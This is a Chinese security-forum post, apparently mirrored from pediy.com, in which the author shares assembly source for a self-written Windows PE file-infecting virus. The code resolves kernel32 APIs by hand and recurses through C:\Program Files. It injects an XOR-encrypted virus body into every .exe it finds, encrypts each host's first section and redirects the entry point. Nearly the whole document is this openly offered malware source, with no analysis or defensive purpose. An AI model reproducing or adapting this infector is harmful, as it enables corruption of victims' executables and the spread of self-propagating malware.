@@ -1,0 +1,888 @@
+
+
+# 刚写的一个病毒（好像是第一次发帖，别砸砖）
+
+> 原文：[`www.pediy.com/kssd/pediy10/95712.html`](https://www.pediy.com/kssd/pediy10/95712.html)
+
+平常都在 debugman 混了，这玩意也不能发那里，就来这里露怯把！！！  
+  
+  
+  
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;  
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;  
+;Module:peinj.asm  
+;  
+;Author:charme\[N.B.C\]  
+;Email:charme000@gmail.com  
+;Time:2009.8.13  
+;Index：www.hi.baidu.com/charme000  
+;Description:  
+;  
+;-感染 c:\\progma file\\下的 exe 文件  
+;-加密开始的一个节  
+;-key 也简单  
+;  
+;Copyright (c) 2009 charme.  
+;  
+;Just for fun!  
+;Do it ,do our best!  
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;  
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;  
+.486  
+.model flat,stdcall  
+option casemap :none  
+  
+include windows.inc  
+include kernel32.inc  
+  
+includelib kernel32.lib  
+  
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;  
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;  
+  
+VIRUS\_SIZE     equ end\_virus - start\_virus     ;病毒大小  
+VIRUS\_BODYSIZE equ end\_virus - virus\_body      ;病毒体大小  
+VIRUS\_DECRSIZE equ virus\_body - start\_virus    ;病毒头大小  
+  
+  
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;  
+;三个过程  
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;  
+@InfectFile PROTO  
+@FirstRecurse PROTO  
+@FindEexRecurse PROTO  
+  
+.data  
+dummy dd 0  
+  
+  
+;;==============================================================;;               == = =       ==     =  
+;;=------------------------------------------------------------=;;            ==            =  =   =  =  
+;;=                                                            =;;           =             =   =  =   =  
+;;=                      \*\*的开始                            =;;          =             =    =  =   =  
+;;=                                                            =;;           =            =    = =    =  
+;;=------------------------------------------------------------=;;            ==         =     =      =  
+;;==============================================================;;               = = == =              =  ==   ==   ==  ==www.hi.baidu.com/charme000==  
+.code  
+  
+start\_virus:  
+  
+call GetDelta            ;变量,执行完 push esp  
+  
+GetDelta:  
+  
+pop ebp  
+sub ebp,offset GetDelta  ;典型的重定位  
+  
+  
+;\*  
+@@:  
+lea esi, \[ebp + offset virus\_body\]  
+lea edi, \[ebp + offset virus\_body\]  
+mov ecx, VIRUS\_BODYSIZE  ;一看就是准备循环  
+mov bl,\[ebp + xor\_key\]   ;加密  
+  
+@@:  
+.if ecx == 0  
+    jmp @F  
+.endif  
+lodsb           ;从 esi 指向的内存中读取一个字节到 al 中，同时 inc esi  
+xor al,bl       ;逐字节加密  
+stosb           ;把 al 中的内存存入 edi  
+dec ecx         ;递减计数  
+jmp @B  
+@@:  
+    jmp @F      ;跳转到\*处  
+  
+virus\_body:     ;开始病毒执行体  
+  
+db "charme"  
+  
+@@:  
+mov esi, \[ebp + firstSegtVOffs\]  
+mov edi,esi  
+mov ecx, \[ebp + firstSegtVSize\];作为计数  
+  
+@@:  
+.if ecx == 0  
+    jmp @F  
+.endif  
+lodsb  
+xor al,bl  
+stosb  
+dec ecx  
+jmp @B  
+@@:  
+mov \[ebp + xor\_key\],bl;保存密匙  
+mov eax,\[esp\]  
+  
+and eax,0FFFFF000h;找到基址  
+  
+compare:  
+cmp WORD ptr \[eax\],'ZM'  
+je api\_found  
+sub eax, 1000h;一页一页搜索  
+jmp compare;循环  
+  
+api\_found:  
+  
+  
+;LoadLibrary  
+mov    \[ebp + KernelBase\], eax;保存指针  
+lea    esi, \[ebp + \_LoadLibrary\]  
+call  GetFunctionAddress  
+mov \[ebp + \_a\_LoadLibrary\],eax;保存函数地址  
+  
+  
+;FindFirstFile  
+mov eax, \[ebp + KernelBase\]  
+lea esi, \[ebp + \_FindFirstFile\]  
+call GetFunctionAddress  
+mov \[ebp + \_a\_FindFirstFile\],eax  
+  
+  
+;SetCurrentDirectory  
+mov eax, \[ebp + KernelBase\]  
+lea esi, \[ebp + \_SetCurrentDirectory\]  
+call GetFunctionAddress  
+mov \[ebp + \_a\_SetCurrentDirectory\],eax  
+  
+  
+;GetFileAttributes  
+mov eax, \[ebp + KernelBase\]  
+lea esi, \[ebp + \_GetFileAttributes\]  
+call GetFunctionAddress  
+mov \[ebp + \_a\_GetFileAttributes\],eax  
+  
+  
+;FindNextFile  
+mov eax, \[ebp + KernelBase\]  
+lea esi, \[ebp + \_FindNextFile\]  
+call GetFunctionAddress  
+mov \[ebp + \_a\_FindNextFile\],eax  
+  
+  
+;FindClose  
+mov eax, \[ebp + KernelBase\]  
+lea esi, \[ebp + \_FindClose\]  
+call GetFunctionAddress  
+mov \[ebp + \_a\_FindClose\],eax  
+  
+  
+;CreateFile  
+mov eax, \[ebp + KernelBase\]  
+lea esi, \[ebp + \_CreateFile\]  
+call GetFunctionAddress  
+mov DWORD ptr \[ebp + \_a\_CreateFile\],eax  
+  
+  
+;lstrcpy  
+mov eax, \[ebp + KernelBase\]  
+lea esi, \[ebp + \_lstrcpy\]  
+call GetFunctionAddress  
+mov DWORD ptr \[ebp + \_a\_lstrcpy\],eax  
+  
+  
+;GetFileSize  
+mov eax, \[ebp + KernelBase\]  
+lea esi, \[ebp + \_GetFileSize\]  
+call GetFunctionAddress  
+mov DWORD ptr \[ebp + \_a\_GetFileSize\],eax  
+  
+  
+;CreateFileMapping  
+mov eax, \[ebp + KernelBase\]  
+lea esi, \[ebp + \_CreateFileMapping\]  
+call GetFunctionAddress  
+mov \[ebp + \_a\_CreateFileMapping\],eax  
+  
+  
+;MapViewOfFile  
+mov eax, \[ebp + KernelBase\]  
+lea esi, \[ebp + \_MapViewOfFile\]  
+call GetFunctionAddress  
+mov \[ebp + \_a\_MapViewOfFile\],eax  
+  
+  
+;ExitProcess  
+mov eax, \[ebp + KernelBase\]  
+lea esi, \[ebp + \_ExitProcess\]  
+call GetFunctionAddress  
+mov \[ebp + \_a\_ExitProcess\],eax  
+  
+  
+;UnmapViewOfFile  
+mov eax, \[ebp + KernelBase\]  
+lea esi, \[ebp + \_UnmapViewOfFile\]  
+call GetFunctionAddress  
+mov \[ebp + \_a\_UnmapViewOfFile\],eax  
+  
+  
+;CloseHandle  
+mov eax, \[ebp + KernelBase\]  
+lea esi, \[ebp + \_CloseHandle\]  
+call GetFunctionAddress  
+mov \[ebp + \_a\_CloseHandle\],eax  
+  
+jmp found\_all  ;来个大跳转  
+  
+  
+  
+;;-----------------------;;  
+;;    从导入表找函数     ;;  
+;;-----------------------;;  
+GetFunctionAddress:  
+    mov    ebx, \[eax + 3Ch\]                    ;pe header  
+    add    ebx, eax;加上基址  
+    add    ebx, 120  
+    mov    ebx, \[ebx\]  
+    add    ebx, eax                        ;Export Address  
+    xor    edx, edx  
+    mov    ecx, \[ebx + 32\]         ;functionname  
+    add    ecx, eax  
+    push    esi  
+    push    edx  
+   
+CompareNext:  
+    pop    edx  
+    pop    esi  
+    inc    edx  
+    mov    edi, \[ecx\]  
+    add    edi, eax  
+    add    ecx, 4  
+    push    esi  
+    push    edx  
+   
+CompareName:  
+    mov    dl, \[edi\]  
+    mov    dh, \[esi\]  
+    cmp    dl, dh  
+    jne    CompareNext  
+    inc    edi  
+    inc    esi  
+    cmp    BYTE ptr \[esi\], 0  
+    je    GetAddress  
+    jmp    CompareName  
+   
+GetAddress:  
+    pop    edx  
+    pop    esi  
+    dec    edx  
+    shl    edx, 1  
+    mov    ecx, \[ebx + 36\]  
+    add    ecx, eax  
+    add    ecx, edx  
+    xor    edx, edx  
+    mov    dx, \[ecx\]  
+    shl    edx, 2  
+    mov    ecx, \[ebx + 28\]  
+    add    ecx, eax  
+    add    ecx, edx  
+    add    eax, \[ecx\]  
+   
+    ret  
+  
+found\_all:  
+  
+lea esi,\[ebp + \_STRING\_RootInfect\]  
+push esi  
+mov eax,\[ebp + \_a\_SetCurrentDirectory\];changes the current directory for the current process  
+call eax  
+  
+push ebp  
+  
+call @FirstRecurse;这个是自己定义的函数  
+  
+pop ebp  
+  
+jmp end\_virus  
+  
+  
+;;-----------------------;;  
+;;         找 exe         ;;  
+;;-----------------------;;  
+@FindEexRecurse PROC  
+  
+;HANDLE FindFirstFile(  
+;  LPCTSTR lpFileName,  
+;  LPWIN32\_FIND\_DATA lpFindFileData  
+;);  
+lea eax,\[ebp + OFFSET \_\_STRUCT\_Win32\_FindExes\]  
+push eax  
+lea eax,\[ebp + OFFSET \_\_STRING\_Dot\_Exe\]  
+push eax  
+mov eax,\[ebp + \_a\_FindFirstFile\]  
+call eax  
+  
+mov \[ebp + \_\_HND\_ExeFind\],eax;保存返回的文件句柄  
+  
+.if eax == INVALID\_HANDLE\_VALUE  
+    mov eax,-1  
+    jmp finish  
+.endif  
+  
+lea esi,\[ebp + OFFSET \_\_STRUCT\_Win32\_FindExes\]  
+assume esi:ptr WIN32\_FIND\_DATA  
+lea eax,\[esi\].cFileName;查询这个成员  
+  
+mov esi,eax  
+lodsb  ;从 esi 中取出一个字节放入 al  
+  
+.if al == '.'  
+    jmp @F  
+.endif  
+  
+lea esi,\[ebp + \_\_STRUCT\_Win32\_FindExes\]  
+  
+assume esi:ptr WIN32\_FIND\_DATA  
+lea eax,\[esi\].cFileName  
+push eax  
+push eax;这里其实 push 一个就可以了  
+mov eax,\[ebp + \_a\_GetFileAttributes\]  
+call eax  ;返回一个文件或者目录的属性  
+  
+.if eax != FILE\_ATTRIBUTE\_DIRECTORY  ;如果是目录  
+pop eax  
+mov \[ebp + \_\_PTR\_fileName\],eax  
+call @InfectFile  ;感染之  
+.else  
+pop eax  
+.endif  
+  
+@@:  
+lea esi,\[ebp + OFFSET \_\_STRUCT\_Win32\_FindExes\]  
+push esi  
+mov esi,\[ebp + \_\_HND\_ExeFind\]  
+push esi  
+mov eax,\[ebp + \_a\_FindNextFile\]  
+call eax  ;继续找文件  
+  
+.if eax == 0  
+jmp @F  
+.endif  
+  
+lea esi,\[ebp + OFFSET \_\_STRUCT\_Win32\_FindExes\]  
+assume esi:ptr WIN32\_FIND\_DATA  
+lea eax,\[esi\].cFileName  
+  
+mov esi,eax  
+lodsb  
+  
+.if al == '.'  
+jmp @B  ;继续找文件  
+.endif  
+  
+lea esi,\[ebp + \_\_STRUCT\_Win32\_FindExes\]  
+  
+assume esi:ptr WIN32\_FIND\_DATA  
+lea eax,\[esi\].cFileName  
+push eax  
+push eax  
+mov eax,\[ebp + \_a\_GetFileAttributes\]  
+call eax  
+  
+.if eax != FILE\_ATTRIBUTE\_DIRECTORY  
+pop eax  
+mov \[ebp + \_\_PTR\_fileName\],eax  
+call @InfectFile  
+.else  
+pop eax  
+.endif  
+  
+jmp @B  ;一直循环  
+  
+@@:  
+  
+finish:  
+ret  
+@FindEexRecurse ENDP  
+  
+  
+;;-----------------------;;  
+;;         一级资源      ;;  
+;;-----------------------;;  
+@FirstRecurse PROC  
+  
+lea esi,\[ebp + OFFSET \_\_STRUCT\_Win32\_FindData\]  
+push esi  
+lea esi,\[ebp + OFFSET \_\_STRING\_Dot\_Star\]  
+push esi  
+mov eax,\[ebp + \_a\_FindFirstFile\]  
+call eax  
+mov \[ebp + \_\_HND\_FirstFind\],eax  
+  
+.if eax == INVALID\_HANDLE\_VALUE  
+mov eax,-1  
+jmp finish1  
+.endif  
+  
+lea esi,\[ebp + OFFSET \_\_STRUCT\_Win32\_FindData\]  
+assume esi:ptr WIN32\_FIND\_DATA  
+lea eax,\[esi\].cFileName  
+  
+mov esi,eax  
+lodsb  
+  
+.if al == '.'  
+jmp @F  
+.endif  
+  
+lea esi,\[ebp + OFFSET \_\_STRUCT\_Win32\_FindData\]  
+assume esi:ptr WIN32\_FIND\_DATA  
+lea eax,\[esi\].cFileName  
+push eax  
+mov eax,\[ebp + \_a\_GetFileAttributes\]  
+call eax  
+  
+.if eax == FILE\_ATTRIBUTE\_DIRECTORY  
+lea esi,\[ebp + OFFSET \_\_STRUCT\_Win32\_FindData\]  
+assume esi:ptr WIN32\_FIND\_DATA  
+lea eax,\[esi\].cFileName  
+push eax  
+mov eax,\[ebp + \_a\_SetCurrentDirectory\]  
+call eax  
+call @FindEexRecurse  
+lea eax,\[ebp + \_\_STRING\_Dot\_Dot\]  
+push eax  
+mov eax,\[ebp + \_a\_SetCurrentDirectory\]  
+call eax  
+.endif  
+  
+@@:  
+lea esi,\[ebp + OFFSET \_\_STRUCT\_Win32\_FindData\]  
+push esi  
+mov eax,\[ebp+\_\_HND\_FirstFind\]  
+push eax  
+mov eax,\[ebp + \_a\_FindNextFile\]  
+call eax  
+  
+.if eax == 0  
+jmp @F  
+.endif  
+  
+lea esi,\[ebp + OFFSET \_\_STRUCT\_Win32\_FindData\]  
+assume esi:ptr WIN32\_FIND\_DATA  
+lea eax,\[esi\].cFileName  
+  
+mov esi,eax  
+lodsb  
+  
+.if al == '.'  
+jmp @B  
+.endif  
+  
+lea esi,\[ebp + OFFSET \_\_STRUCT\_Win32\_FindData\]  
+assume esi:ptr WIN32\_FIND\_DATA  
+lea eax,\[esi\].cFileName  
+push eax  
+mov eax,\[ebp + \_a\_GetFileAttributes\]  
+call eax  
+  
+.if eax == FILE\_ATTRIBUTE\_DIRECTORY  
+lea esi,\[ebp + OFFSET \_\_STRUCT\_Win32\_FindData\]  
+assume esi:ptr WIN32\_FIND\_DATA  
+lea eax,\[esi\].cFileName  
+push eax  
+mov eax,\[ebp + \_a\_SetCurrentDirectory\]  
+call eax  
+call @FindEexRecurse  
+lea eax,\[ebp + \_\_STRING\_Dot\_Dot\]  
+push eax  
+mov eax,\[ebp + \_a\_SetCurrentDirectory\]  
+call eax  
+.endif  
+  
+jmp @B  
+  
+@@:  
+finish1:  
+ret  
+@FirstRecurse ENDP  
+  
+  
+;;-----------------------;;  
+;;           感染        ;;  
+;;-----------------------;;  
+@InfectFile PROC  
+push NULL  
+push FILE\_ATTRIBUTE\_NORMAL  
+push OPEN\_ALWAYS  
+push NULL  
+push FILE\_SHARE\_READ or FILE\_SHARE\_WRITE  
+push GENERIC\_WRITE or GENERIC\_READ  
+mov eax,\[ebp + \_\_PTR\_fileName\];文件指针  
+push eax  
+mov eax,\[ebp + \_a\_CreateFile\];创建文件  
+call eax  
+mov \[ebp + \_\_HND\_File\],eax;文件句柄  
+  
+push NULL  
+push eax  
+mov eax,\[ebp + \_a\_GetFileSize\]  
+call eax  ;获得文件大小  
+add eax,VIRUS\_SIZE  
+add eax,1000h  
+mov \[ebp + \_\_max\_size\],eax;最后文件的大小  
+  
+push 0  
+mov eax,\[ebp + \_\_max\_size\]  
+push eax  
+push 0  
+push PAGE\_READWRITE  
+push NULL  
+mov eax,\[ebp + \_\_HND\_File\]  
+push eax  
+mov eax,\[ebp + \_a\_CreateFileMapping\]  
+call eax  ;创建映射文件  
+mov \[ebp + \_\_MAP\_File\],eax;hMap  
+  
+push DWORD ptr \[ebp + offset \_\_max\_size\]  
+push 0  
+push 0  
+push FILE\_MAP\_WRITE  
+mov eax,\[ebp  + \_\_MAP\_File\]  
+push eax  
+mov eax,\[ebp + \_a\_MapViewOfFile\]  
+call eax;开始映射  
+mov \[ebp + \_\_PTR\_File\],eax  
+  
+mov edi,eax  
+xor eax,eax  
+assume edi:ptr IMAGE\_DOS\_HEADER  
+mov ax,\[edi\].e\_magic  
+  
+add edi,\[edi\].e\_lfanew  
+  
+assume edi:ptr IMAGE\_NT\_HEADERS  
+add edi,SIZEOF DWORD  
+assume edi:ptr IMAGE\_FILE\_HEADER  
+xor ecx,ecx  
+mov cx,\[edi\].NumberOfSections  
+mov \[ebp + totalSec\],ecx;节个数  
+  
+add edi,SIZEOF IMAGE\_FILE\_HEADER  
+mov \[ebp + ptrEP\],edi;到达节表处  
+assume edi:ptr IMAGE\_OPTIONAL\_HEADER32  
+mov eax,\[edi\].ImageBase  
+mov \[ebp + firstSegtVOffs\],eax;镜像基址  
+add eax,\[edi\].AddressOfEntryPoint  
+mov \[ebp + oldEP\],eax;保存旧的入口点  
+  
+mov eax,\[edi\].FileAlignment  
+mov \[ebp + fileAlign\],eax  
+  
+add edi,SIZEOF IMAGE\_OPTIONAL\_HEADER32  
+  
+assume edi:ptr IMAGE\_SECTION\_HEADER  
+  
+  
+;    - EDI 指向当前节表头  
+;    - ESI 指向 RawData 高位  
+;    - EAX holds ESI's "parent" segment header pointer  
+  
+xor esi,esi  
+@@:  
+.if ecx == 0  
+jmp @F  
+.endif  
+  
+; 加密第一个节表  
+  
+.if esi == 0  
+mov eax,\[edi\].PointerToRawData  
+mov \[ebp + firstSegtOffset\],eax  
+mov eax,\[edi\].VirtualAddress  
+add \[ebp + firstSegtVOffs\],eax;rva  
+mov eax,\[edi\].Misc.VirtualSize  
+mov \[ebp + firstSegtVSize\],eax  
+mov al,BYTE ptr \[edi\].Name1  
+mov \[ebp + firstSegtKey\],al  
+  
+mov eax,\[edi\].Characteristics  
+or eax,0A0000020h  
+mov \[edi\].Characteristics,eax  
+  
+.endif  
+  
+.if \[edi\].PointerToRawData > esi  
+mov esi,\[edi\].PointerToRawData  
+mov eax,edi  
+.endif  
+add edi,SIZEOF IMAGE\_SECTION\_HEADER  
+dec ecx  
+jmp @B  ;循环  
+  
+@@:  
+mov edi,eax  
+  
+assume edi:ptr IMAGE\_SECTION\_HEADER  
+  
+mov ebx,\[edi\].Misc.VirtualSize  
+add ebx,VIRUS\_SIZE  
+add ebx,7  
+mov \[edi\].Misc.VirtualSize,ebx  
+  
+push edi  
+lea eax,\[edi\].Name1  
+mov edi,eax  
+  
+mov al,'.'             ;text section  
+stosb  
+mov al,'t'  
+stosb  
+mov al,'e'  
+stosb  
+mov al,'x'  
+stosb  
+mov al,'t'  
+stosb  
+mov al,0  
+stosb  
+  
+pop edi  
+  
+xor edx,edx  
+mov eax,ebx  
+mov ebx,\[ebp + fileAlign\]  
+div ebx  ;对齐下  
+  
+.if edx == 0  
+mov eax,\[edi\].Misc.VirtualSize  
+jmp dont\_round  
+.endif  
+  
+mov eax,\[edi\].Misc.VirtualSize  
+mov ebx,\[ebp + fileAlign\]  
+push ebx  
+  
+xor ecx,ecx  
+mov edx,eax       
+  
+@@:  
+inc ecx  
+shr ebx,1  
+.if ebx == 0  
+dec ecx  
+jmp @F  
+.endif  
+jmp @B  
+  
+@@:  
+sar eax,cl  
+sal eax,cl  
+pop ebx  
+add eax,ebx  
+  
+dont\_round:  
+mov ebx,\[edi\].SizeOfRawData  
+mov \[edi\].SizeOfRawData,eax  
+sub eax,ebx  
+shr eax,12  
+shl eax,12  
+  
+mov \[ebp + deltaImage\],eax  
+  
+mov eax,\[edi\].Characteristics  
+or eax,0A0000020h  
+mov \[edi\].Characteristics,eax  
+  
+mov esi,\[edi\].VirtualAddress  
+add esi,\[edi\].Misc.VirtualSize  
+sub esi,VIRUS\_SIZE  
+sub esi,7  
+  
+push esi                                  ; 新入口点  
+  
+mov esi,\[edi\].PointerToRawData  
+add esi,\[edi\].Misc.VirtualSize  
+sub esi,VIRUS\_SIZE  
+sub esi,7  
+  
+mov edi,esi  
+add edi,\[ebp + \_\_PTR\_File\]  
+  
+lea esi, \[ebp + offset start\_virus\]       ; 解密  
+mov ecx, VIRUS\_DECRSIZE  
+rep movsb;esi 中的拷贝到 edi  
+  
+lea esi, \[ebp + offset virus\_body\]  
+mov ecx, VIRUS\_BODYSIZE  
+mov bl,\[ebp + xor\_key\]  
+  
+;变换 key  
+  
+inc bl  
+  
+; xor 0,bl = bl  
+  
+xor al,al  
+mov \[ebp + xor\_key\],al  
+  
+@@:  
+.if ecx == 0  
+jmp @F  
+.endif  
+lodsb  
+xor al,bl  
+stosb  
+dec ecx  
+jmp @B   
+@@:  
+  
+push edi  
+  
+; 加密主体  
+  
+mov esi, \[ebp + firstSegtOffset\]  
+add esi, \[ebp + \_\_PTR\_File\]  
+mov edi,esi  
+mov ecx, \[ebp + firstSegtVSize\]  
+  
+@@:  
+.if ecx == 0  
+jmp @F  
+.endif  
+lodsb  
+xor al,bl  
+stosb  
+dec ecx  
+jmp @B   
+@@:  
+  
+pop edi  
+  
+mov al,0b8h;感染标记  
+stosb  
+  
+mov eax,\[ebp + oldEP\]  
+stosd  
+  
+mov ax,0d0ffh;还原标记  
+stosw  
+  
+mov edi,\[ebp + ptrEP\]  
+assume edi:ptr IMAGE\_OPTIONAL\_HEADER32  
+pop eax  
+mov \[edi\].AddressOfEntryPoint,eax  
+pop eax  
+  
+mov ebx,\[edi\].SizeOfImage  
+mov eax,\[ebp + deltaImage\]  
+add ebx,eax  
+mov \[edi\].SizeOfImage,ebx  
+  
+; 清理战场  
+  
+mov eax,\[ebp + \_\_PTR\_File\]  
+push eax  
+mov eax,\[ebp + \_a\_UnmapViewOfFile\]  
+call eax  
+  
+mov eax,\[ebp + \_\_MAP\_File\]  
+push eax  
+mov eax,\[ebp + \_a\_CloseHandle\]  
+call eax  
+  
+mov eax,\[ebp + \_\_HND\_File\]  
+push eax  
+mov eax,\[ebp + \_a\_CloseHandle\]  
+call eax  
+  
+ret  
+@InfectFile ENDP  
+  
+jmp end\_virus  
+;;-----------------------------------无穷寂寞--------------------------------------;;  
+xor\_key           db 0  
+  
+firstSegtOffset   dd 0  
+firstSegtVSize    dd 0  
+firstSegtVOffs    dd 0  
+firstSegtKey      db 0  
+  
+\_LoadLibrary db "LoadLibrary",0  
+\_a\_LoadLibrary dd 0  
+  
+\_CreateFile db "CreateFile",0  
+\_a\_CreateFile dd 0  
+  
+\_CreateFileMapping db "CreateFileMapping",0  
+\_a\_CreateFileMapping dd 0  
+  
+\_MapViewOfFile db "MapViewOfFile",0  
+\_a\_MapViewOfFile dd 0  
+  
+\_SetCurrentDirectory db "SetCurrentDirectory",0  
+\_a\_SetCurrentDirectory dd 0  
+  
+\_ExitProcess db "ExitProcess",0  
+\_a\_ExitProcess dd 0  
+  
+\_MessageBox db "MessageBox",0  
+\_a\_MessageBox dd 0  
+  
+\_UnmapViewOfFile db "UnmapViewOfFile",0  
+\_a\_UnmapViewOfFile dd 0  
+  
+\_CloseHandle db "CloseHandle",0  
+\_a\_CloseHandle dd 0  
+  
+\_GetFileSize db "GetFileSize",0  
+\_a\_GetFileSize dd 0  
+  
+\_FindFirstFile db "FindFirstFile",0  
+\_a\_FindFirstFile dd 0  
+  
+\_GetFileAttributes db "GetFileAttributes",0  
+\_a\_GetFileAttributes dd 0  
+  
+\_FindNextFile db "FindNextFile",0  
+\_a\_FindNextFile dd 0  
+  
+\_FindClose db "FindClose",0  
+\_a\_FindClose dd 0  
+  
+\_lstrcpy db "lstrcpy",0  
+\_a\_lstrcpy dd 0  
+  
+\_\_DLL\_User32 db "user32",0  
+  
+\_\_STRING\_FileName db "petest.exe",0  
+\_\_STRING\_newdir db MAX\_PATH dup(0)  
+\_\_STRING\_dotdot db "..",0  
+\_\_STRING\_filemask db "\*.\*",0  
+  
+\_\_STRING\_Dot\_Star db "\*.\*",0  
+\_\_STRING\_Dot\_Exe db "\*.exe",0  
+\_\_STRING\_Dot\_Dot db "..",0  
+\_\_HND\_File dd 0  
+\_\_HND\_FirstFind dd 0  
+\_\_HND\_ExeFind dd 0  
+\_\_MAP\_File dd 0  
+\_\_PTR\_File dd 0  
+  
+;\_User32 dd 0  
+KernelBase dd 0  
+totalSec dd 0  
+ptrEP dd 0  
+oldEP dd 0  
+oldLast dd 0  
+secNum dd 0  
+fileAlign dd 0  
+deltaImage dd 0  
+oldrawsize dd 0  
+  
+\_\_STRUCT\_Win32\_FindData WIN32\_FIND\_DATA <>  
+\_\_STRUCT\_Win32\_FindExes WIN32\_FIND\_DATA <>  
+  
+  
+\_STRING\_RootInfect db "C:\\Program Files\\",0  
+  
+  
+\_\_PTR\_fileName dd 0  
+\_\_max\_size     dd 0  
+;;-----------------------------------无穷寂寞--------------------------------------;;  
+end\_virus:  
+  
+ret  
+end start\_virus
